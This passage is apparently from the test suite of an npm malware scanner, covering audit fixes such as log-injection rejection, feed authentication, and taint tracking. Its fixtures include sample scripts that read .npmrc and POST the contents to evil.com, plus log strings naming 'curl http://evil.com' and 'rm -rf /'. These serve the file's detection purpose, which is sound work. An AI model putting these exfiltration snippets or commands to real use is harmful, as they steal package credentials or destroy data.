    const { safeDnsResolve } = require('../../src/shared/download.js');
    let threw = false;
    try {
      await safeDnsResolve('127.0.0.1');
    } catch (e) {
      threw = true;
      assert(e.message.includes('rebinding') || e.message.includes('private'),
        'Error should mention rebinding or private');
    }
    assert(threw, 'Should throw for private IP literal');
  });

  await asyncTest('H7: safeDnsResolve rejects 10.x IP literals', async () => {
    const { safeDnsResolve } = require('../../src/shared/download.js');
    let threw = false;
    try {
      await safeDnsResolve('10.0.0.1');
    } catch (e) {
      threw = true;
    }
    assert(threw, 'Should throw for 10.0.0.1 IP literal');
  });
}

// ===================================================================
// HIGH #11: Worker threads preload injection
// ===================================================================
async function runHighFix11Tests() {
  console.log('\n=== HIGH #11: Worker threads preload injection ===\n');

  test('H11: preload.js has worker_threads interception', () => {
    const src = fs.readFileSync(path.join(__dirname, '../../docker/preload.js'), 'utf8');
    assert(src.includes("require('worker_threads')"), 'Should require worker_threads');
    assert(src.includes('_OrigWorker'), 'Should store original Worker constructor');
    assert(src.includes('MUADDIB_TIME_OFFSET_MS'), 'Should pass time offset to workers');
    assert(src.includes('--require'), 'Should add --require preload.js to worker execArgv');
  });

  test('H11: preload.js logs WORKER category', () => {
    const src = fs.readFileSync(path.join(__dirname, '../../docker/preload.js'), 'utf8');
    assert(src.includes("log('WORKER'"), 'Should log WORKER category when spawning');
  });

  test('H11: analyzer.js accepts WORKER as valid category', () => {
    const { isValidPreloadLine } = require('../../src/sandbox/analyzer.js');
    assert(isValidPreloadLine('[PRELOAD] WORKER: Worker spawned: ./task.js (t+50ms)'),
      'Should accept WORKER category');
  });
}

// ===================================================================
// HIGH #13: Log injection prevention
// ===================================================================
async function runHighFix13Tests() {
  console.log('\n=== HIGH #13: Log injection prevention ===\n');

  test('H13: preload.js sanitizes newlines in log messages', () => {
    const src = fs.readFileSync(path.join(__dirname, '../../docker/preload.js'), 'utf8');
    assert(src.includes('safeMsg'), 'Should use safeMsg for sanitization');
    assert(src.includes('safeCat'), 'Should sanitize category too');
    assert(src.includes('.substring(0, 1000)'), 'Should truncate to 1000 chars');
  });

  test('H13: analyzer.js validates log line format', () => {
    const { isValidPreloadLine } = require('../../src/sandbox/analyzer.js');
    // Valid lines
    assert(isValidPreloadLine('[PRELOAD] TIMER: setTimeout delay=4000ms (t+10ms)'), 'Should accept TIMER');
    assert(isValidPreloadLine('[PRELOAD] FS_READ: SENSITIVE /root/.npmrc (t+20ms)'), 'Should accept FS_READ');
    assert(isValidPreloadLine('[PRELOAD] NETWORK: https.request evil.com (t+30ms)'), 'Should accept NETWORK');
    assert(isValidPreloadLine('[PRELOAD] EXEC: execSync DANGEROUS curl http://evil.com (t+40ms)'), 'Should accept EXEC');
    assert(isValidPreloadLine('[PRELOAD] ENV_ACCESS: NPM_TOKEN (t+50ms)'), 'Should accept ENV_ACCESS');
    assert(isValidPreloadLine('[PRELOAD] NATIVE_ADDON: process.dlopen: /x.node (t+60ms)'), 'Should accept NATIVE_ADDON');
  });

  test('H13: analyzer.js rejects injected fake log lines', () => {
    const { isValidPreloadLine } = require('../../src/sandbox/analyzer.js');
    // Injected lines with invalid categories
    assert(!isValidPreloadLine('[PRELOAD] FAKE_CAT: injected data'), 'Should reject FAKE_CAT');
    assert(!isValidPreloadLine('some random text [PRELOAD] EXEC: fake'), 'Should reject non-standard prefix');
    assert(!isValidPreloadLine(''), 'Should reject empty line');
    assert(!isValidPreloadLine(null), 'Should reject null');
  });

  test('H13: analyzer.js ignores injected lines in scoring', () => {
    const { analyzePreloadLog } = require('../../src/sandbox/analyzer.js');
    // Simulate log injection: attacker injects a fake EXEC line via newline in a message
    const log = [
      '[PRELOAD] INIT: Preload active. TIME_OFFSET=0ms (0.0h). PID=1 (t+0ms)',
      '[PRELOAD] INJECTED: DANGEROUS curl http://evil.com (t+10ms)', // invalid category
      'FAKE [PRELOAD] EXEC: DANGEROUS rm -rf / (t+20ms)', // not starting with [PRELOAD]
    ].join('\n');
    const result = analyzePreloadLog(log);
    const execFinding = result.findings.find(f => f.type === 'sandbox_exec_suspicious');
    assert(!execFinding, 'Should NOT produce exec finding from injected log lines');
  });
}

// ===================================================================
// HIGH #16: Feed auth + rate limiting
// ===================================================================
async function runHighFix16Tests() {
  console.log('\n=== HIGH #16: Feed auth + rate limiting ===\n');

  test('H16: checkAuth allows requests when no token configured', () => {
    const { checkAuth } = require('../../src/serve.js');
    const origToken = process.env.MUADDIB_FEED_TOKEN;
    delete process.env.MUADDIB_FEED_TOKEN;
    try {
      const result = checkAuth({ headers: {} });
      assert(result.ok === true, 'Should allow when no token configured');
    } finally {
      if (origToken !== undefined) process.env.MUADDIB_FEED_TOKEN = origToken;
    }
  });

  test('H16: checkAuth rejects missing auth header', () => {
    const { checkAuth } = require('../../src/serve.js');
    const origToken = process.env.MUADDIB_FEED_TOKEN;
    process.env.MUADDIB_FEED_TOKEN = 'test-secret-token';
    try {
      const result = checkAuth({ headers: {} });
      assert(result.ok === false, 'Should reject missing auth header');
      assert(result.error.includes('Missing'), 'Error should mention missing header');
    } finally {
      if (origToken !== undefined) process.env.MUADDIB_FEED_TOKEN = origToken;
      else delete process.env.MUADDIB_FEED_TOKEN;
    }
  });

  test('H16: checkAuth rejects invalid token', () => {
    const { checkAuth } = require('../../src/serve.js');
    const origToken = process.env.MUADDIB_FEED_TOKEN;
    process.env.MUADDIB_FEED_TOKEN = 'correct-token';
    try {
      const result = checkAuth({ headers: { authorization: 'Bearer wrong-token' } });
      assert(result.ok === false, 'Should reject invalid token');
    } finally {
      if (origToken !== undefined) process.env.MUADDIB_FEED_TOKEN = origToken;
      else delete process.env.MUADDIB_FEED_TOKEN;
    }
  });

  test('H16: checkAuth accepts valid bearer token', () => {
    const { checkAuth } = require('../../src/serve.js');
    const origToken = process.env.MUADDIB_FEED_TOKEN;
    process.env.MUADDIB_FEED_TOKEN = 'my-secret-token';
    try {
      const result = checkAuth({ headers: { authorization: 'Bearer my-secret-token' } });
      assert(result.ok === true, 'Should accept valid bearer token');
    } finally {
      if (origToken !== undefined) process.env.MUADDIB_FEED_TOKEN = origToken;
      else delete process.env.MUADDIB_FEED_TOKEN;
    }
  });

  test('H16: checkRateLimit allows requests under limit', () => {
    const { checkRateLimit, rateLimitMap } = require('../../src/serve.js');
    rateLimitMap.clear();
    const result = checkRateLimit('192.168.1.100');
    assert(result.ok === true, 'First request should be allowed');
    assert(typeof result.remaining === 'number', 'Should return remaining count');
  });

  test('H16: checkRateLimit blocks after exceeding limit', () => {
    const { checkRateLimit, rateLimitMap, RATE_LIMIT_MAX } = require('../../src/serve.js');
    rateLimitMap.clear();
    const testIp = '10.0.0.99';
    // Exhaust the rate limit
    for (let i = 0; i < RATE_LIMIT_MAX; i++) {
      checkRateLimit(testIp);
    }
    const result = checkRateLimit(testIp);
    assert(result.ok === false, 'Should block after exceeding rate limit');
    assert(result.remaining === 0, 'Remaining should be 0');
    rateLimitMap.clear();
  });
}

// ===================================================================
// HIGH #17: Temporal detections persistence
// ===================================================================
async function runHighFix17Tests() {
  console.log('\n=== HIGH #17: Temporal detections persistence ===\n');

  test('H17: appendTemporalDetection exported', () => {
    const { appendTemporalDetection } = require('../../src/monitor.js');
    assert(typeof appendTemporalDetection === 'function', 'Should export appendTemporalDetection');
  });

  test('H17: loadTemporalDetections exported', () => {
    const { loadTemporalDetections } = require('../../src/monitor.js');
    assert(typeof loadTemporalDetections === 'function', 'Should export loadTemporalDetections');
  });

  test('H17: appendTemporalDetection persists findings', () => {
    const { appendTemporalDetection, loadTemporalDetections, TEMPORAL_DETECTIONS_FILE } = require('../../src/monitor.js');
    // Save original file if it exists
    let origContent = null;
    if (fs.existsSync(TEMPORAL_DETECTIONS_FILE)) {
      origContent = fs.readFileSync(TEMPORAL_DETECTIONS_FILE, 'utf8');
    }
    try {
      // Remove file to start clean
      try { fs.unlinkSync(TEMPORAL_DETECTIONS_FILE); } catch {}
      const findings = [
        { type: 'lifecycle_added_critical', severity: 'CRITICAL', message: 'test finding' }
      ];
      appendTemporalDetection('test-pkg', '1.0.0', findings);
      const loaded = loadTemporalDetections();
      assert(Array.isArray(loaded), 'Should return array');
      assert(loaded.length >= 1, 'Should have at least 1 detection');
      const last = loaded[loaded.length - 1];
      assert(last.name === 'test-pkg', 'Should store package name');
      assert(last.version === '1.0.0', 'Should store version');
      assert(Array.isArray(last.findings), 'Should store findings array');
    } finally {
      // Restore original file
      if (origContent !== null) {
        fs.writeFileSync(TEMPORAL_DETECTIONS_FILE, origContent);
      } else {
        try { fs.unlinkSync(TEMPORAL_DETECTIONS_FILE); } catch {}
      }
    }
  });
}

// ===================================================================
// HIGH #22: EventEmitter taint tracking in dataflow
// ===================================================================
async function runHighFix22Tests() {
  console.log('\n=== HIGH #22: EventEmitter taint tracking ===\n');

  await asyncTest('H22: Detects EventEmitter taint flow: emit tainted data to network sink handler', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-h22-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"h22-test","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'exfil.js'), `
const fs = require('fs');
const https = require('https');
const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.on('data', function(payload) {
  https.request({ hostname: 'evil.com', method: 'POST' }).end(payload);
});
const secret = fs.readFileSync('.npmrc', 'utf8');
emitter.emit('data', secret);
`);
      const result = await runScanDirect(tmpDir);
      const threat = result.threats.find(t =>
        t.type === 'suspicious_dataflow' || t.type === 'event_emitter_taint'
      );
      assert(threat, 'Should detect EventEmitter taint propagation');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  test('H22: dataflow.js has eventHandlers tracking', () => {
    const src = fs.readFileSync(path.join(__dirname, '../../src/scanner/dataflow.js'), 'utf8');
    assert(src.includes('eventHandlers'), 'Should track event handlers');
    assert(src.includes('emitTaintedEvents'), 'Should track tainted emits');
  });
}

// ===================================================================
// HIGH #23: Function parameter taint propagation in dataflow
// ===================================================================
async function runHighFix23Tests() {
  console.log('\n=== HIGH #23: Function parameter taint propagation ===\n');

  await asyncTest('H23: Detects taint propagation through function params', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-h23-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"h23-test","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'exfil.js'), `
const fs = require('fs');
const https = require('https');
function exfiltrate(data) {
  https.request({ hostname: 'evil.com', method: 'POST' }).end(data);
}
const token = fs.readFileSync('.npmrc', 'utf8');
exfiltrate(token);
`);
      const result = await runScanDirect(tmpDir);
      const threat = result.threats.find(t =>
        t.type === 'suspicious_dataflow'
      );
      assert(threat, 'Should detect taint propagation through function parameters');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  test('H23: dataflow.js has functionDefs tracking', () => {
    const src = fs.readFileSync(path.join(__dirname, '../../src/scanner/dataflow.js'), 'utf8');
    assert(src.includes('functionDefs'), 'Should track function definitions');
  });
}

// ===================================================================
// HIGH #24: Module graph 5-hop re-export chain
// ===================================================================
async function runHighFix24Tests() {
  console.log('\n=== HIGH #24: Module graph 5-hop re-export chain ===\n');

  test('H24: module-graph.js uses level < 4 for re-export propagation', () => {
    const src = fs.readFileSync(path.join(__dirname, '../../src/scanner/module-graph.js'), 'utf8');
    assert(src.includes('level < 4'), 'Should use level < 4 for 5-hop propagation');
    assert(!src.includes('level < 2;'), 'Should NOT have old level < 2 limit');
  });
}

// ===================================================================
// HIGH #25: Dynamic require concatenation in module-graph
// ===================================================================
async function runHighFix25Tests() {
  console.log('\n=== HIGH #25: Dynamic require string concatenation ===\n');

  test('H25: tryResolveConcatRequire resolves simple string concat', () => {
    const { tryResolveConcatRequire } = require('../../src/scanner/module-graph.js');
    // Simulate a BinaryExpression node: './a' + '/b'
    const node = {
      type: 'BinaryExpression',
      operator: '+',
      left: { type: 'Literal', value: './a' },
      right: { type: 'Literal', value: '/b' }
    };
    const result = tryResolveConcatRequire(node);
    assert(result === './a/b', `Should resolve to './a/b', got '${result}'`);
  });

  test('H25: tryResolveConcatRequire resolves nested concat', () => {
    const { tryResolveConcatRequire } = require('../../src/scanner/module-graph.js');
    // './a' + '/' + 'b'  =  BinaryExpression(BinaryExpression('./a', '/'), 'b')
    const node = {
      type: 'BinaryExpression',
      operator: '+',
      left: {
        type: 'BinaryExpression',
        operator: '+',
        left: { type: 'Literal', value: './a' },
        right: { type: 'Literal', value: '/' }
      },
      right: { type: 'Literal', value: 'b' }
    };
    const result = tryResolveConcatRequire(node);
    assert(result === './a/b', `Should resolve to './a/b', got '${result}'`);
  });

  test('H25: tryResolveConcatRequire returns null for non-string nodes', () => {
    const { tryResolveConcatRequire } = require('../../src/scanner/module-graph.js');
    const node = {
      type: 'BinaryExpression',
      operator: '+',
      left: { type: 'Identifier', name: 'x' },
      right: { type: 'Literal', value: './b' }
    };
    const result = tryResolveConcatRequire(node);
    assert(result === null, 'Should return null for non-literal operands');
  });

  test('H25: tryResolveConcatRequire has depth limit', () => {
    const { tryResolveConcatRequire } = require('../../src/scanner/module-graph.js');
    // Build deeply nested node (25 levels, beyond the 20 limit)
    let node = { type: 'Literal', value: 'a' };
    for (let i = 0; i < 25; i++) {
      node = {
        type: 'BinaryExpression',
        operator: '+',
        left: node,
        right: { type: 'Literal', value: 'b' }
      };
    }
    const result = tryResolveConcatRequire(node);
    assert(result === null, 'Should return null for deeply nested nodes (depth limit)');
  });
}

// ===================================================================
// HIGH #27: Control flow flattening detection
// ===================================================================
async function runHighFix27Tests() {
  console.log('\n=== HIGH #27: Control flow flattening detection ===\n');

  test('H27: detectControlFlowFlattening detects switch-dispatcher pattern', () => {
    const { detectControlFlowFlattening } = require('../../src/scanner/deobfuscate.js');
    const cffCode = `
function obfuscated() {
  var state = 0;
  while (true) {
    switch (state) {
      case 0:
        console.log("step 1");
        state = 2;
        break;
      case 1:
        console.log("step 3");
        state = 3;
        break;
      case 2:
        console.log("step 2");
        state = 1;
        break;
      case 3:
        return;
    }
  }
}`;
    assert(detectControlFlowFlattening(cffCode) === true, 'Should detect CFF pattern');
  });

  test('H27: detectControlFlowFlattening rejects normal switch', () => {
    const { detectControlFlowFlattening } = require('../../src/scanner/deobfuscate.js');
    const normalCode = `
var x = getInput();
switch (x) {
  case 1: doA(); break;
  case 2: doB(); break;
  case 3: doC(); break;
}`;
    assert(detectControlFlowFlattening(normalCode) === false, 'Should not flag normal switch');
  });

  test('H27: detectControlFlowFlattening rejects while-switch with < 3 cases', () => {
    const { detectControlFlowFlattening } = require('../../src/scanner/deobfuscate.js');
    const code = `
var s = 0;
while (true) {
  switch (s) {
    case 0: s = 1; break;
    case 1: return;
  }
}`;
    assert(detectControlFlowFlattening(code) === false, 'Should not flag < 3 cases');
  });

  test('H27: detectControlFlowFlattening handles while(1) variant', () => {
    const { detectControlFlowFlattening } = require('../../src/scanner/deobfuscate.js');
    const code = `
function runner() {
  var _state = 0;
  while (1) {
    switch (_state) {
      case 0: _state = 1; break;
      case 1: _state = 2; break;
      case 2: _state = 3; break;
      case 3: return;
    }
  }
}`;
    assert(detectControlFlowFlattening(code) === true, 'Should detect while(1) variant');
  });

  test('H27: detectControlFlowFlattening handles invalid code gracefully', () => {
    const { detectControlFlowFlattening } = require('../../src/scanner/deobfuscate.js');
    assert(detectControlFlowFlattening('not valid javascript {{{') === false, 'Should return false for invalid code');
    assert(detectControlFlowFlattening('') === false, 'Should return false for empty string');
  });
}

// ===================================================================
// HIGH #30: Module graph catch block logging
// ===================================================================
async function runHighFix30Tests() {
  console.log('\n=== HIGH #30: Module graph error logging ===\n');

  test('H30: index.js logs module graph errors with debugLog', () => {
    const src = fs.readFileSync(path.join(__dirname, '../../src/index.js'), 'utf8');
    assert(src.includes("debugLog('[MODULE-GRAPH] Error:'"), 'Should log module graph errors via debugLog');
    assert(!src.includes('catch { }') && !src.includes('catch {}'), 'Should NOT have empty catch block for module graph');
  });
}

// ===================================================================
// HIGH #31: Cross-file scoring bonus
// ===================================================================
async function runHighFix31Tests() {
  console.log('\n=== HIGH #31: Cross-file scoring bonus ===\n');

  test('H31: calculateRiskScore includes crossFileBonus', () => {
    const { calculateRiskScore } = require('../../src/scoring.js');
    // Single file: score should equal file score + package score
    const singleFileThreats = [
      { type: 'dangerous_exec', severity: 'HIGH', file: 'evil.js', message: 'exec' }
    ];
    const result1 = calculateRiskScore(singleFileThreats);
    assert(result1.crossFileBonus === 0, 'Single file should have 0 crossFileBonus');
  });

  test('H31: Multi-file threats get cross-file bonus', () => {
    const { calculateRiskScore } = require('../../src/scoring.js');
    // 3 files each with 1 HIGH threat (10 points each)
    const multiFileThreats = [
      { type: 'dangerous_exec', severity: 'HIGH', file: 'a.js', message: 'exec1' },
      { type: 'dangerous_exec', severity: 'HIGH', file: 'b.js', message: 'exec2' },
      { type: 'dangerous_exec', severity: 'HIGH', file: 'c.js', message: 'exec3' }
    ];
    const result = calculateRiskScore(multiFileThreats);
    assert(result.crossFileBonus > 0, `Multi-file should have positive crossFileBonus, got ${result.crossFileBonus}`);
    // Each non-max file scores 10, 25% = 3 each (ceil), so bonus = 3+3 = 6
    assert(result.crossFileBonus === 6, `Expected crossFileBonus=6, got ${result.crossFileBonus}`);
    // Total: maxFile(10) + bonus(6) + package(0) = 16
    assert(result.riskScore === 16, `Expected riskScore=16, got ${result.riskScore}`);
  });

  test('H31: Cross-file bonus capped at 25', () => {
    const { calculateRiskScore } = require('../../src/scoring.js');
    // 10 files each with 1 CRITICAL threat (25 points each)
    const manyFileThreats = [];
    for (let i = 0; i < 10; i++) {
      manyFileThreats.push({
        type: 'dangerous_exec', severity: 'CRITICAL', file: `file${i}.js`, message: `exec${i}`
      });
    }
    const result = calculateRiskScore(manyFileThreats);
    assert(result.crossFileBonus <= 25, `Cross-file bonus should be capped at 25, got ${result.crossFileBonus}`);
    // 9 non-max files × ceil(25*0.25) = 9×7 = 63, capped at 25
    assert(result.crossFileBonus === 25, `Expected crossFileBonus=25, got ${result.crossFileBonus}`);
  });

  test('H31: Package-level threats still add separately', () => {
    const { calculateRiskScore } = require('../../src/scoring.js');
    const threats = [
      { type: 'dangerous_exec', severity: 'HIGH', file: 'evil.js', message: 'exec' },
      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'lifecycle' }
    ];
    const result = calculateRiskScore(threats);
    // File score: 10 (1 HIGH). Package score: 3 (1 MEDIUM). No cross-file bonus (1 file only).
    assert(result.maxFileScore === 10, `Expected maxFileScore=10, got ${result.maxFileScore}`);
    assert(result.packageScore === 3, `Expected packageScore=3, got ${result.packageScore}`);
    assert(result.riskScore === 13, `Expected riskScore=13, got ${result.riskScore}`);
  });
}

// ===================================================================
// EXPORT
// ===================================================================
async function runAuditFixTests() {
  await runAuditFix1Tests();
  await runAuditFix2Tests();
  await runAuditFix3Tests();
  await runAuditFix4Tests();
  await runAuditFix5Tests();
  await runAuditFix6Tests();
  await runAuditFix7Tests();
  await runAuditFix8Tests();
  await runAuditFix9Tests();
  await runAuditFix10Tests();
  await runCritical10Tests();
  await runCritical15Tests();
  await runCritical18Tests();
  // HIGH fixes
  await runHighFix3Tests();
  await runHighFix4Tests();
  await runHighFix7Tests();
  await runHighFix11Tests();
  await runHighFix13Tests();
  await runHighFix16Tests();
  await runHighFix17Tests();
  await runHighFix22Tests();
  await runHighFix23Tests();
  await runHighFix24Tests();
  await runHighFix25Tests();
  await runHighFix27Tests();
  await runHighFix30Tests();
  await runHighFix31Tests();
}

module.exports = { runAuditFixTests };
